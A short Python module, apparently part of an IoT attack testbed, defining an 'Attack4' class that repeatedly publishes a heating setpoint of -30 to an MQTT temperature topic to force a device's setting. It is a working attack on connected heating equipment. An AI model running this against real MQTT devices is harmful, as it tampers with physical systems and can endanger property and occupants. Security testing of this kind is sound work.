from typing import Tuple

from config import ATTACK4_INTERVAL, MQTT_SET_TEMP_TOPIC
from mqtt_service import publish_to_topic
from attacks.base import BaseAttack


class Attack4(BaseAttack):
    """Ataque 4: Fuerza temperatura a -30 constantemente en el topic de temperatura."""

    def __init__(self):
        super().__init__('attack4', 'ATAQUE 4 (TEMP -30)', ATTACK4_INTERVAL)

    def execute_attack(self) -> Tuple[bool, str, bool]:
        return publish_to_topic(MQTT_SET_TEMP_TOPIC, {'current_heating_setpoint': -30})
